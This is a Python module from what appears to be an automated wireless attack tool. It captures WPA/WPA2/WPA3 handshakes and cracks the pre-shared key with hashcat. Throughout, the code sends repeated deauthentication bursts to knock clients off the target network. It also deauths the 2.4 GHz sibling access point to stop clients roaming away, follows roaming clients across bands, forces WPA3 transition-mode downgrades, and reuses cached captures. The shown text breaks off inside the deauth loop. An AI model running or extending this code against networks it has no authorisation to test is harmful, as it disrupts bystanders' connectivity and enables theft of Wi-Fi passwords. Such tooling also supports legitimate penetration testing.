"""WPA handshake capture and crack."""

from __future__ import annotations

import os
import re
import shutil
import time
from contextlib import nullcontext
from datetime import datetime, timezone

from ..models import AccessPoint, CrackResult, EncryptionType, HandshakeCaptureInfo
from ..tools.adaptive_deauth import AdaptiveDeauthEngine, DeauthOutcome, DeauthSnapshot
from ..tools.band_siblings import band_sibling_aps
from ..tools.aireplay import Aireplay
from ..tools.deauth_backends import DeauthRoundRequest, HandshakeDeauthDispatcher, parse_deauth_tools
from ..tools.airodump import Airodump
from ..tools.client_filter import active_clients, filter_clients, is_heard_client, is_valid_client
from ..tools.interface import set_channel
from ..input import resolve_capture_health
from ..tools.capture_health import analyze_cap_health, reset_health_cache
from ..tools.transition import strategy_summary, transition_downgrade_enabled
from ..tools.handshake_detect import (
    HandshakeValidation,
    cap_has_reconnect,
    check_handshake,
    extract_hash,
    extract_hash_preferred,
    find_hash_bssid,
    reset_check_cache,
    validate_handshake_capture,
)
from ..tools.hashcat import Hashcat, HcxTools
from ..tools.interface import recover_interface
from .base import Attack, AttackResult

HCX_CHECK_INTERVAL = 2.0  # seconds between hcxpcapngtool scans on same cap size
MIN_PASSIVE_CAPTURE = 8.0  # ignore early cap candidates during passive listen


class HandshakeAttack(Attack):
    name = "handshake"

    def can_attack(self) -> bool:
        if not self.cfg.attack.handshake:
            return False
        if self.ap.encryption not in (EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3):
            return False
        if self.ap.is_enterprise:
            return False
        return True

    @staticmethod
    def _essid_root(essid: str | None) -> str:
        if not essid:
            return ""
        root = re.sub(r"(?i)(5\s*ghz|2\.?4\s*ghz|24\s*ghz|5g|2g)", "", essid)
        return re.sub(r"[^a-z0-9]", "", root.lower())

    def _sibling_band_ap(self) -> AccessPoint | None:
        """2.4 GHz partner AP for dual-band routers (shared PSK)."""
        if self.ap.radio_band != "5":
            return None
        root = self._essid_root(self.ap.essid)
        best: AccessPoint | None = None
        pool = self.tracker.discovered_targets or self.tracker.targets
        for candidate in pool:
            if candidate.bssid == self.ap.bssid or candidate.radio_band != "2":
                continue
            if candidate.encryption not in (
                EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3,
            ):
                continue
            other_root = self._essid_root(candidate.essid)
            if not root or not other_root:
                continue
            if root in other_root or other_root in root:
                if best is None or candidate.power > best.power:
                    best = candidate
        return best

    def _cap_bssids(self, extra: list[str] | None = None) -> list[str]:
        seen = {self.ap.bssid.upper()}
        out = [self.ap.bssid]
        for bssid in extra or []:
            mac = bssid.strip().upper()
            if mac not in seen:
                seen.add(mac)
                out.append(mac)
        sibling = self._sibling_band_ap()
        if sibling and sibling.bssid.upper() not in seen:
            seen.add(sibling.bssid.upper())
            out.append(sibling.bssid)
        pool = self.tracker.discovered_targets or self.tracker.targets
        for candidate in pool:
            if candidate.channel == self.ap.channel and candidate.bssid.upper() not in seen:
                seen.add(candidate.bssid.upper())
                out.append(candidate.bssid)
        return out

    def _prefer_hash_bssids(self, cap_path: str) -> list[str]:
        """Ordered BSSID preference list for hash extraction from *cap_path*."""
        prefer: list[str] = []
        seen: set[str] = set()

        def add(mac: str | None) -> None:
            if not mac:
                return
            key = mac.upper()
            if key not in seen:
                seen.add(key)
                prefer.append(key)

        add(getattr(self, "_cap_hit_bssid", None))
        add(self._cap_bssid_from_name(os.path.basename(cap_path)))
        add(self.ap.bssid)
        for mac in self._cap_bssids():
            add(mac)
        return prefer

    def _hash_from_cap(self, cap_path: str) -> tuple[str, str] | None:
        """Return (bssid, hash_line) for any crackable handshake in *cap_path*."""
        return extract_hash_preferred(cap_path, self._prefer_hash_bssids(cap_path))

    def _existing_cap(self) -> str | None:
        self._cap_hit_bssid = None
        if self.cfg.attack.new_handshake:
            return None
        hs_dir = self.cfg.output.handshake_dir
        if not os.path.isdir(hs_dir):
            return None
        check_order: list[tuple[str, str | None]] = [(self.ap.bssid, self.ap.essid)]
        sibling = self._sibling_band_ap()
        if sibling:
            check_order.append((sibling.bssid, sibling.essid))
        for bssid, essid in check_order:
            found = self._cap_in_hs_dir(hs_dir, bssid, essid)
            if found:
                path, hit_bssid, hit_essid = found
                self._cap_hit_bssid = hit_bssid
                if hit_bssid != self.ap.bssid:
                    label = hit_essid or hit_bssid
                    self.tracker.log(
                        f"Using [green]2.4GHz sibling[/] handshake from "
                        f"[cyan]{label}[/] (shared PSK)",
                        tag="handshake",
                    )
                return path
        root = self._essid_root(self.ap.essid)
        if root:
            for fname in sorted(os.listdir(hs_dir), reverse=True):
                if not fname.startswith("handshake_") or not fname.endswith(".cap"):
                    continue
                cap_essid = self._cap_essid_from_name(fname)
                if not cap_essid or not (
                    root in self._essid_root(cap_essid)
                    or self._essid_root(cap_essid) in root
                ):
                    continue
                cap_bssid = self._cap_bssid_from_name(fname)
                if not cap_bssid or cap_bssid == self.ap.bssid:
                    continue
                path = os.path.join(hs_dir, fname)
                if check_handshake(path, cap_bssid, cap_essid):
                    self._cap_hit_bssid = cap_bssid
                    self.tracker.log(
                        f"Using [green]band sibling[/] handshake from "
                        f"[cyan]{cap_essid}[/] (shared PSK)",
                        tag="handshake",
                    )
                    return path
        return None

    @staticmethod
    def _cap_bssid_from_name(fname: str) -> str | None:
        match = re.search(r"_([0-9A-F]{2}(?:-[0-9A-F]{2}){5})_", fname, re.IGNORECASE)
        if not match:
            return None
        return match.group(1).replace("-", ":").upper()

    @staticmethod
    def _cap_essid_from_name(fname: str) -> str | None:
        parts = fname.replace(".cap", "").split("_")
        if len(parts) < 3:
            return None
        return parts[1]

    def _cap_in_hs_dir(
        self, hs_dir: str, bssid: str, essid: str | None,
    ) -> tuple[str, str, str | None] | None:
        bssid_safe = re.escape(bssid.replace(":", "-"))
        pattern = re.compile(rf"handshake_.*_{bssid_safe}_.*\.cap")
        for fname in sorted(os.listdir(hs_dir), reverse=True):
            if not pattern.match(fname):
                continue
            path = os.path.join(hs_dir, fname)
            if check_handshake(path, bssid, essid):
                return path, bssid, essid
        return None

    def _save_cap(self, src: str) -> str:
        essid_safe = re.sub(r"[^a-zA-Z0-9]", "", self.ap.display_name)
        bssid_safe = self.ap.bssid.replace(":", "-")
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        dst = os.path.join(
            self.cfg.output.handshake_dir,
            f"handshake_{essid_safe}_{bssid_safe}_{ts}.cap",
        )
        shutil.copy2(src, dst)
        return dst

    def run(self) -> AttackResult:
        self.tracker.clear_skip()
        self._cap_hit_bssid = None
        capture_started = time.time()
        timeout = self.cfg.attack.wpa_timeout

        if self.cfg.attack.new_handshake:
            self.status("init", "Forcing fresh handshake capture (--new-hs)", timeout=timeout, started=capture_started)
            self.tracker.log(
                "Ignoring saved handshakes in hs/ — live capture required",
                tag="handshake",
            )
        else:
            self.status("init", "Checking cached handshakes...", timeout=timeout, started=capture_started)
        capfile = self._existing_cap()
        if capfile:
            from ..input import prompt_use_cached_handshake, should_prompt_cached_handshake

            if should_prompt_cached_handshake(self.cfg):
                if not prompt_use_cached_handshake(capfile, self.ap, self.tracker):
                    capfile = None
        if capfile:
            self.status("capture", "Using cached handshake", timeout=timeout, started=capture_started)
            self._handshake_capture_info = self._info_from_cached(capfile)
            if os.path.basename(capfile).upper().find(self.ap.bssid.replace(":", "-").upper()) >= 0:
                self.tracker.log(
                    f"Found existing capture for {self.ap.display_name}", tag="handshake",
                )
            else:
                self.tracker.log(
                    f"Found existing capture → {os.path.basename(capfile)}", tag="handshake",
                )
        else:
            self._use_capture_health = resolve_capture_health(self.cfg, self.tracker)
            if self._use_capture_health:
                self.tracker.log("Live capture health panel enabled", tag="handshake")
            self.status("capture", "Recovering interface...", timeout=timeout, started=capture_started)
            iface = recover_interface(
                self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
            )
            self.cfg.scan.interface = iface
            self.tracker.log(f"Listening on ch{self.ap.channel} for {timeout}s...", tag="handshake")
            capfile = self._capture(capture_started, timeout)

        if self.should_stop():
            return self.skipped_result()
        if not capfile:
            return AttackResult(False, message="Handshake capture failed")

        cap_abs = os.path.abspath(capfile)
        hs_root = self.cfg.output.handshake_dir.rstrip(os.sep) + os.sep
        saved = capfile if cap_abs.startswith(hs_root) else self._save_cap(capfile)

        if self.cfg.attack.skip_crack or not self.cfg.attack.wordlist:
            self.status("done", f"Saved to {os.path.basename(saved)}", started=capture_started)
            return AttackResult(True, message=f"Handshake saved to {saved}")

        self.status(
            "capture", "Handshake captured — validating...",
            timeout=timeout, started=capture_started,
        )
        self.tracker.log(
            "Handshake captured — running full validation before crack",
            tag="handshake",
        )
        self._preresolved_wordlist = None
        interactive = not (
            self.cfg.auto_mode
            or self.cfg.output.quiet
            or self.cfg.output.json_output
        )
        if interactive:
            suspend_ctx = self.tracker.suspend_live()
        else:
            suspend_ctx = nullcontext()
        with suspend_ctx:
            validation = self._confirm_handshake(saved)
            if not validation:
                self.status("failed", "Handshake validation failed", started=capture_started)
                return AttackResult(False, message="Handshake validation failed")

            hash_bssid, hash_line = validation.bssid, validation.hash_line
            self._cap_hit_bssid = hash_bssid
            self._finalize_capture_info(saved, hash_bssid, validation)
            if hash_bssid.upper() != self.ap.bssid.upper():
                self.tracker.log(
                    f"Hash from [cyan]{hash_bssid}[/] (band sibling — shared PSK)",
                    tag="handshake",
                )
            if interactive:
                self._preresolved_wordlist = self._resolve_crack_wordlist(
                    already_suspended=True,
                )

        key = self.crack_hashcat(hash_line, capture_started)
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method="handshake", capture_file=saved,
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=capture_started)
            return AttackResult(True, crack=crack, message=f"Handshake cracked: {key}")
        self.status("failed", "Password not in wordlist", started=capture_started)
        return AttackResult(False, message="Handshake captured but not cracked")

    def _merge_clients(
        self,
        clients: list[str],
        power: dict[str, int],
        raw: list[tuple[str, int]],
    ) -> list[str]:
        """Add valid, heard stations; return newly added MACs."""
        added: list[str] = []
        for station, pwr in raw:
            mac = station.strip().upper()
            if not is_valid_client(mac, self.ap.bssid):
                continue
            power[mac] = pwr
            if not is_heard_client(mac, power) or mac in clients:
                continue
            clients.append(mac)
            added.append(mac)
        return added

    def _seed_clients(self) -> tuple[list[str], dict[str, int]]:
        power = {c.station.upper(): c.power for c in self.ap.clients}
        clients = active_clients(
            filter_clients([c.station for c in self.ap.clients], self.ap.bssid),
            power,
            self.ap.bssid,
        )
        if clients:
            self.tracker.log(
                f"Seeded {len(clients)} active client(s): [green]{', '.join(clients)}[/]",
                tag="handshake",
            )
        return clients, power

    def _deauth_essid(self) -> str | None:
        if self.ap.essid_known and self.ap.essid:
            return self.ap.essid
        return None

    def _prefer_transition_wpa2(self) -> bool:
        return transition_downgrade_enabled(self.cfg, self.ap)

    def _confirm_handshake(self, capfile: str) -> HandshakeValidation | None:
        from ..display import (
            show_handshake_rejected,
            show_handshake_validated,
            show_handshake_validating,
        )
        from ..input import prompt_space_to_continue

        show_handshake_validating(self.ap, capfile)
        validation = validate_handshake_capture(
            capfile,
            self._prefer_hash_bssids(capfile),
            essid=self.ap.display_name,
            prefer_wpa2=self._prefer_transition_wpa2(),
        )
        interactive = not (
            self.cfg.auto_mode
            or self.cfg.output.quiet
            or self.cfg.output.json_output
        )
        if not validation.valid:
            show_handshake_rejected(self.ap, validation.message)
            if interactive:
                prompt_space_to_continue(
                    message="Handshake validation failed — press SPACE to return",
                )
            self.tracker.log(
                f"[red]Handshake validation failed:[/] {validation.message}",
                tag="handshake",
            )
            return None
        show_handshake_validated(
            self.ap, validation.message, bssid=validation.bssid,
        )
        if interactive:
            prompt_space_to_continue(
                message="Handshake ready — press SPACE to continue to cracking",
            )
        self.tracker.log(
            f"[green]Handshake validated[/] — {validation.message}",
            tag="handshake",
        )
        return validation

    def _finalize_capture_info(
        self,
        capfile: str,
        hit_bssid: str,
        validation: HandshakeValidation,
    ) -> None:
        if getattr(self, "_pending_capture_meta", None):
            meta = self._pending_capture_meta
            self._handshake_capture_info = self._build_live_capture_info(
                capfile,
                hit_bssid,
                deauth_rounds=meta.get("deauth_rounds", 0),
                clients=meta.get("clients", 0),
                cap_kb=meta.get("cap_kb", 0),
                capture_phase=meta.get("capture_phase", "passive"),
            )
        elif getattr(self, "_handshake_capture_info", None):
            info = self._handshake_capture_info
            self._handshake_capture_info = HandshakeCaptureInfo(
                summary=info.summary,
                capture_file=capfile,
                channel=info.channel,
                hash_bssid=hit_bssid,
                target_bssid=info.target_bssid,
                essid=info.essid,
                source=info.source,
                cap_size_kb=os.path.getsize(capfile) // 1024 if os.path.exists(capfile) else 0,
                show_banner=info.show_banner,
            )
        else:
            self._handshake_capture_info = HandshakeCaptureInfo(
                summary=validation.message,
                capture_file=capfile,
                channel=self.ap.channel,
                hash_bssid=hit_bssid,
                target_bssid=self.ap.bssid,
                essid=self.ap.display_name,
                source="live",
                cap_size_kb=os.path.getsize(capfile) // 1024 if os.path.exists(capfile) else 0,
            )

    def _info_from_cached(self, capfile: str) -> HandshakeCaptureInfo:
        hit = getattr(self, "_cap_hit_bssid", None) or self.ap.bssid
        basename = os.path.basename(capfile)
        size_kb = os.path.getsize(capfile) // 1024 if os.path.exists(capfile) else 0
        if hit.upper() != self.ap.bssid.upper():
            summary = (
                f"Recovered existing handshake from hs/ — band sibling "
                f"{hit} shares PSK with {self.ap.display_name}"
            )
            source = "sibling_band"
        else:
            summary = f"Recovered existing handshake from hs/ — no new capture required"
            source = "cached"
        return HandshakeCaptureInfo(
            summary=summary,
            capture_file=capfile,
            channel=self.ap.channel,
            hash_bssid=hit,
            target_bssid=self.ap.bssid,
            essid=self.ap.display_name,
            source=source,
            cap_size_kb=size_kb,
            show_banner=False,
        )

    def _should_show_capture_banner(
        self,
        *,
        capture_phase: str,
        deauth_rounds: int,
    ) -> bool:
        """Banner only after adaptive deauth exhausted and handshake recovered passively."""
        if self.cfg.attack.no_deauth or deauth_rounds <= 0:
            return False
        if not getattr(self, "_deauth_adaptive_exhausted", False):
            return False
        return capture_phase in ("passive", "final_sweep")

    def _build_live_capture_info(
        self,
        capfile: str,
        hit_bssid: str,
        *,
        deauth_rounds: int,
        clients: int,
        cap_kb: int,
        capture_phase: str = "passive",
    ) -> HandshakeCaptureInfo:
        meta = getattr(self, "_live_capture_meta", {})
        tools = list(dict.fromkeys(getattr(self, "_deauth_tools_used", [])))
        tools_label = " → ".join(tools) if tools else ""
        passive = bool(meta.get("passive"))

        show_banner = self._should_show_capture_banner(
            capture_phase=capture_phase,
            deauth_rounds=deauth_rounds,
        )

        if meta.get("sibling_fallback"):
            summary = (
                "Captured on 2.4 GHz band sibling — shared PSK — after 5 GHz "
                "deauth did not yield a handshake"
            )
            source = "sibling_band"
            show_banner = True
        elif show_banner:
            summary = (
                f"Deauth was ineffective after all adaptive cycles — WPA handshake "
                f"recovered during {'final sweep' if capture_phase == 'final_sweep' else 'passive listen'} "
                f"on channel {self.ap.channel}"
            )
            source = "live"
        elif passive:
            summary = (
                f"WPA 4-way handshake captured during passive listen on "
                f"channel {self.ap.channel}"
            )
            source = "live"
        elif deauth_rounds > 0:
            tool_part = f" using {tools_label}" if tools_label else ""
            summary = (
                f"WPA 4-way handshake captured after {deauth_rounds} deauth round(s)"
                f"{tool_part} on channel {self.ap.channel}"
            )
            source = "live"
        else:
            summary = f"WPA 4-way handshake captured on channel {self.ap.channel}"
            source = "live"

        if hit_bssid.upper() != self.ap.bssid.upper():
            summary += f" (EAPOL from router BSSID {hit_bssid})"

        return HandshakeCaptureInfo(
            summary=summary,
            capture_file=capfile,
            channel=self.ap.channel,
            hash_bssid=hit_bssid,
            target_bssid=self.ap.bssid,
            essid=self.ap.display_name,
            deauth_rounds=deauth_rounds,
            deauth_tools=tools_label,
            clients=clients,
            source=source,
            cap_size_kb=cap_kb,
            show_banner=show_banner,
        )

    def _capture_health_stats(self, cap: str | None) -> dict[str, int | bool]:
        if not getattr(self, "_use_capture_health", False) or not cap:
            return {}
        return analyze_cap_health(cap, self.ap.bssid).as_stats()

    def _try_handshake(
        self,
        cap: str | None,
        *,
        clients: int,
        deauth_rounds: int,
        cap_kb: int,
        started: float,
        timeout: int,
        alt_bssids: list[str] | None = None,
        capture_phase: str = "passive",
    ) -> str | None:
        if not cap or not os.path.exists(cap) or os.path.getsize(cap) < 24:
            return None
        if capture_phase == "passive":
            min_until = getattr(self, "_min_candidate_time", started + MIN_PASSIVE_CAPTURE)
            if time.time() < min_until:
                return None
        if (
            self.cfg.attack.new_handshake
            and not self.cfg.attack.no_deauth
            and deauth_rounds < 1
        ):
            return None
        prefer_wpa2 = self._prefer_transition_wpa2() and capture_phase != "final_sweep"
        hit_bssid = find_hash_bssid(
            cap,
            self._cap_bssids(alt_bssids),
            min_interval=HCX_CHECK_INTERVAL,
            prefer_wpa2=prefer_wpa2,
            allow_wpa3_fallback=not prefer_wpa2,
        )
        if not hit_bssid and self._prefer_transition_wpa2() and capture_phase == "final_sweep":
            hit_bssid = find_hash_bssid(
                cap,
                self._cap_bssids(alt_bssids),
                min_interval=HCX_CHECK_INTERVAL,
            )
            if hit_bssid:
                self.tracker.log(
                    "[yellow]Transition downgrade missed[/] — using WPA3/SAE handshake",
                    tag="handshake",
                )
        if not hit_bssid:
            return None

        hash_line = extract_hash(
            cap,
            hit_bssid,
            prefer_wpa2=self._prefer_transition_wpa2(),
            allow_wpa3_fallback=True,
        )
        if not hash_line:
            return None

        self.status(
            "capture", "Handshake candidate — validation pending",
            timeout=timeout, started=started,
            clients=clients, deauths=deauth_rounds, cap_kb=cap_kb,
            **self._capture_health_stats(cap),
        )
        self.tracker.log(
            "[yellow]Possible handshake in capture[/] — stopping listen for "
            "full validation before crack",
            tag="handshake",
        )
        self._pending_capture_meta = {
            "deauth_rounds": deauth_rounds,
            "clients": clients,
            "cap_kb": cap_kb,
            "capture_phase": capture_phase,
        }
        try:
            saved = self._save_cap(cap)
            self.tracker.log(f"Saved candidate capture → {saved}", tag="handshake")
            return saved
        except OSError as e:
            self.tracker.log(f"[red]failed to persist capture: {e}[/]", tag="handshake")
            return None

    def _band_block_deauth(self, heard: list[str]) -> None:
        """Kick clients off the 2.4 GHz sibling so they cannot roam away from 5 GHz."""
        sibling = self._sibling_band_ap()
        if not sibling or not heard:
            return
        iface = self.cfg.scan.interface
        set_channel(iface, sibling.channel, band=sibling.radio_band)
        focus = heard[0]
        self.tracker.log(
            f"[yellow]Band-block[/]: deauth [cyan]{sibling.display_name}[/] ch{sibling.channel} "
            f"→ {focus}",
            tag="handshake",
        )
        Aireplay.deauth_round(
            self.cfg, sibling.bssid, heard,
            essid=sibling.essid if sibling.essid_known else None,
            focus=focus,
        )
        set_channel(iface, self.ap.channel, band=self.ap.radio_band)
        time.sleep(0.5)

    def _stalk_listen_seconds(self) -> int:
        return max(12, min(28, int(self.cfg.attack.deauth_listen * 2)))

    def _band_stalk_targets(self) -> list[AccessPoint]:
        pool = self.tracker.discovered_targets or self.tracker.targets
        return band_sibling_aps(self.ap, pool)[:3]

    def _quick_listen_band(
        self,
        target: AccessPoint,
        *,
        stalk_clients: list[str],
        duration: int,
        started: float,
        timeout: int,
        deauth_rounds: int,
        deadline: float,
    ) -> str | None:
        """Short listen on a band sibling for roaming clients after deauth."""
        if duration < 8 or time.time() >= deadline:
            return None
        duration = min(duration, max(8, int(deadline - time.time())))
        client_label = ", ".join(stalk_clients[:3])
        if len(stalk_clients) > 3:
            client_label += f" +{len(stalk_clients) - 3}"
        self.tracker.log(
            f"[cyan]Band-stalk[/]: listen [yellow]{target.display_name}[/] "
            f"ch{target.channel} ({target.band_label}, {duration}s) "
            f"for client(s) {client_label}",
            tag="handshake",
        )
        iface = recover_interface(
            self.cfg.scan.interface, target.channel, band=target.radio_band,
        )
        self.cfg.scan.interface = iface
        set_channel(iface, target.channel, band=target.radio_band)
        try:
            with Airodump(
                self.cfg,
                channel=target.channel,
                bssid=target.bssid,
                band=target.radio_band,
                prefix="hs_stalk",
            ) as dump:
                if not dump.alive():
                    return None
                listen_until = time.time() + duration
                while time.time() < listen_until:
                    if self.abort_if_skipped() or time.time() >= deadline:
                        return None
                    cap = dump.get_cap_file()
                    cap_kb = os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0
                    found = self._try_handshake(
                        cap,
                        clients=len(stalk_clients),
                        deauth_rounds=deauth_rounds,
                        cap_kb=cap_kb,
                        started=started,
                        timeout=timeout,
                        alt_bssids=[target.bssid],
                        capture_phase="band_stalk",
                    )
                    if found:
                        return found
                    time.sleep(0.5)
        except Exception as e:
            self.tracker.log(f"[red]band-stalk error: {e}[/]", tag="handshake")
        finally:
            recover_interface(
                self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
            )
            set_channel(
                self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
            )
        return None

    def _client_band_stalk_round(
        self,
        stalk_clients: list[str],
        *,
        started: float,
        timeout: int,
        deauth_rounds: int,
        deadline: float,
    ) -> str | None:
        """Hop to sibling bands and listen for clients that roamed after deauth."""
        if not self.cfg.attack.client_band_stalk or not stalk_clients:
            return None
        siblings = self._band_stalk_targets()
        if not siblings:
            return None
        per_band = self._stalk_listen_seconds()
        for sibling in siblings:
            if self.abort_if_skipped() or time.time() >= deadline:
                return None
            found = self._quick_listen_band(
                sibling,
                stalk_clients=stalk_clients,
                duration=per_band,
                started=started,
                timeout=timeout,
                deauth_rounds=deauth_rounds,
                deadline=deadline,
            )
            if found:
                return found
        return None

    def _fallback_sibling_capture(self, started: float, timeout: int) -> str | None:
        sibling = self._sibling_band_ap()
        if not sibling:
            return None
        remain = max(30, int(timeout - (time.time() - started)))
        self.tracker.log(
            f"[yellow]5 GHz deauth ineffective[/] — capturing on "
            f"[cyan]{sibling.display_name}[/] ch{sibling.channel} ({remain}s, shared PSK)",
            tag="handshake",
        )
        saved_ap = self.ap
        self.ap = sibling
        try:
            return self._capture_band(
                started, remain, band_block=False, sibling_fallback=True,
            )
        finally:
            self.ap = saved_ap

    def _capture(self, started: float, timeout: int) -> str | None:
        found = self._capture_band(
            started, timeout, band_block=self.ap.radio_band == "5",
        )
        if found or self.ap.radio_band != "5":
            return found
        return self._fallback_sibling_capture(started, timeout)

    def _capture_band(
        self,
        started: float,
        timeout: int,
        *,
        band_block: bool,
        sibling_fallback: bool = False,
    ) -> str | None:
        self._deauth_tools_used: list[str] = []
        self._deauth_adaptive_exhausted = bool(sibling_fallback)
        self._live_capture_meta = {
            "passive": self.cfg.attack.no_deauth,
            "sibling_fallback": sibling_fallback,
        }
        if self._prefer_transition_wpa2():
            summary = strategy_summary(self.ap)
            if summary:
                self.tracker.log(f"[cyan]Transition strategy[/] — {summary}", tag="handshake")
        clients, client_power = self._seed_clients()
        deadline = time.time() + timeout
        deauth_rounds = 0
        focus_idx = 0
        restart_count = 0
        essid = self._deauth_essid()
        reset_check_cache()
        reset_health_cache()
        channel_bssids: list[str] = []

        deauth_engine = AdaptiveDeauthEngine(
            deauth_listen=self.cfg.attack.deauth_listen,
            deauth_burst=self.cfg.attack.deauth_burst,
            channel=self.ap.channel,
            band=self.ap.radio_band,
            enabled=self.cfg.attack.adaptive_deauth and not self.cfg.attack.no_deauth,
        )
        deauth_params = deauth_engine.initial_params()
        self._min_candidate_time = time.time() + max(
            MIN_PASSIVE_CAPTURE,
            deauth_params.passive_first if not self.cfg.attack.no_deauth else MIN_PASSIVE_CAPTURE,
        )
        deauth_dispatcher = HandshakeDeauthDispatcher(
            self.cfg,
            tools=parse_deauth_tools(self.cfg.attack.deauth_tools),
            rotate=self.cfg.attack.deauth_rotate,
            combo=self.cfg.attack.deauth_combo,
        )
        last_deauth_outcome: DeauthOutcome | None = None
        next_deauth = time.time() + deauth_params.passive_first
        deauth_warned = False
        use_band_block = band_block and deauth_params.use_band_block

        try:
            with Airodump(
                self.cfg,
                channel=self.ap.channel,
                bssid=self.ap.bssid,
                band=self.ap.radio_band,
                prefix="hs",
            ) as dump:
                if not dump.alive():
                    self.tracker.log(
                        "[yellow]airodump-ng failed — recovering interface and retrying[/]",
                        tag="handshake",
                    )
                    self.cfg.scan.interface = recover_interface(
                        self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
                    )
                    dump.restart()
                if not dump.alive():
                    self.tracker.log("[red]airodump-ng failed to start[/]", tag="handshake")
                    return None

                width = set_channel(
                    self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
                )
                self.tracker.log(
                    f"Tuned to ch{self.ap.channel} ({self.ap.band_label}, {width})",
                    tag="handshake",
                )
                if not self.cfg.attack.no_deauth:
                    if deauth_engine.enabled:
                        self.tracker.log(
                            f"Adaptive deauth: passive [yellow]{deauth_params.passive_first:.0f}s[/], "
                            f"then tune bursts/listen from capture health "
                            f"(baseline [yellow]{deauth_params.interval:.0f}s[/] / "
                            f"[green]{deauth_params.listen_window:.0f}s[/], "
                            f"{deauth_params.packet_count} pkt)",
                            tag="handshake",
                        )
                    else:
                        self.tracker.log(
                            f"Reactive capture: passive [yellow]{deauth_params.passive_first:.0f}s[/], then "
                            f"deauth every [yellow]{deauth_params.interval:.0f}s[/] → "
                            f"[green]{deauth_params.listen_window:.0f}s[/] EAPOL listen",
                            tag="handshake",
                        )
                    if deauth_dispatcher.enabled:
                        mode = "combo" if self.cfg.attack.deauth_combo else (
                            "rotate" if self.cfg.attack.deauth_rotate else "fixed"
                        )
                        labels = ", ".join(t.value for t in deauth_dispatcher.available)
                        self.tracker.log(
                            f"Deauth backends ({mode}): [cyan]{labels}[/]",
                            tag="handshake",
                        )

                while time.time() < deadline:
                    if self.abort_if_skipped():
                        return None
                    remaining = int(deadline - time.time())

                    if not dump.alive():
                        restart_count += 1
                        if restart_count > 5:
                            self.tracker.log("[red]airodump-ng keeps dying — aborting[/]", tag="handshake")
                            return None
                        self.tracker.log("[yellow]airodump-ng died — restarting[/]", tag="handshake")
                        self.cfg.scan.interface = recover_interface(
                        self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
                    )
                        dump.restart()
                        time.sleep(1)
                        continue

                    targets = dump.parse_targets()
                    for t in targets:
                        if t.channel == self.ap.channel and t.bssid not in channel_bssids:
                            channel_bssids.append(t.bssid)
                    target = next((t for t in targets if t.bssid == self.ap.bssid), None)
                    if target:
                        raw = [(c.station, c.power) for c in target.clients]
                        added = self._merge_clients(clients, client_power, raw)
                        for mac in added:
                            pwr = client_power.get(mac, -1)
                            self.tracker.log(
                                f"New client: [green]{mac}[/] (pwr {pwr})",
                                tag="handshake",
                            )

                    cap = dump.get_cap_file()
                    cap_kb = os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0

                    found = self._try_handshake(
                        cap,
                        clients=len(clients),
                        deauth_rounds=deauth_rounds,
                        cap_kb=cap_kb,
                        started=started,
                        timeout=timeout,
                        alt_bssids=channel_bssids,
                        capture_phase="passive",
                    )
                    if found:
                        return found

                    now = time.time()
                    if not self.cfg.attack.no_deauth and now >= next_deauth:
                        deauth_rounds += 1
                        heard = active_clients(clients, client_power, self.ap.bssid)
                        stale = len(clients) - len(heard)
                        focus = heard[focus_idx % len(heard)] if heard else None
                        if heard:
                            focus_idx += 1
                        if focus:
                            target_label = f"*broadcast* + {focus}"
                        elif heard:
                            target_label = f"*broadcast* + {heard[0]}"
                        else:
                            target_label = "*broadcast* only"
                        if stale > 0:
                            target_label += f" ({stale} stale ignored)"
                        health_before = DeauthSnapshot.from_stats(
                            self._capture_health_stats(cap),
                        )
                        strategy = deauth_params.strategy
                        next_tools = deauth_dispatcher.peek_next_tools(last_deauth_outcome)
                        next_tool_label = "+".join(t.value for t in next_tools) if next_tools else "none"
                        self.tracker.log(
                            f"[yellow]Deauth round #{deauth_rounds}[/] via [cyan]{next_tool_label}[/] "
                            f"({deauth_params.packet_count} pkt, {strategy}) → {target_label}",
                            tag="handshake",
                        )
                        self.status(
                            "capture",
                            f"Deauth #{deauth_rounds} [{strategy}] ({remaining}s left)",
                            timeout=timeout,
                            started=started,
                            clients=len(heard) or len(clients),
                            deauths=deauth_rounds,
                            cap_kb=cap_kb,
                            **self._capture_health_stats(cap),
                        )
                        if use_band_block and heard:
                            self._band_block_deauth(heard)
                        tool_label = deauth_dispatcher.run_round(
                            self.cfg,
                            DeauthRoundRequest(
                                bssid=self.ap.bssid,
                                clients=heard,
                                essid=essid,
                                focus=focus,
                                packet_count=deauth_params.packet_count,
                            ),
                            outcome=last_deauth_outcome,
                        )
                        if tool_label and tool_label != "none":
                            self._deauth_tools_used.append(tool_label)
                        rx_until = min(deadline, now + deauth_params.listen_window)
                        while time.time() < rx_until:
                            if self.abort_if_skipped():
                                return None
                            cap = dump.get_cap_file()
                            cap_kb = os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0
                            found = self._try_handshake(
                                cap,
                                clients=len(heard) or len(clients),
                                deauth_rounds=deauth_rounds,
                                cap_kb=cap_kb,
                                started=started,
                                timeout=timeout,
                                alt_bssids=channel_bssids,
                                capture_phase="deauth_listen",
                            )
                            if found:
                                return found
                            time.sleep(0.5)
                        if self.cfg.attack.client_band_stalk and heard:
                            stalk_found = self._client_band_stalk_round(
                                heard,
                                started=started,
                                timeout=timeout,
                                deauth_rounds=deauth_rounds,
                                deadline=deadline,
                            )
                            if stalk_found:
                                return stalk_found
                        cap = dump.get_cap_file()
                        health_after = DeauthSnapshot.from_stats(
                            self._capture_health_stats(cap),
                        )
                        if deauth_engine.enabled:
                            deauth_params = deauth_engine.record_outcome(
                                health_before, health_after,
                            )
                            last_deauth_outcome = deauth_engine.last_outcome
                            if deauth_params.strategy == "passive-heavy":
                                self._deauth_adaptive_exhausted = True
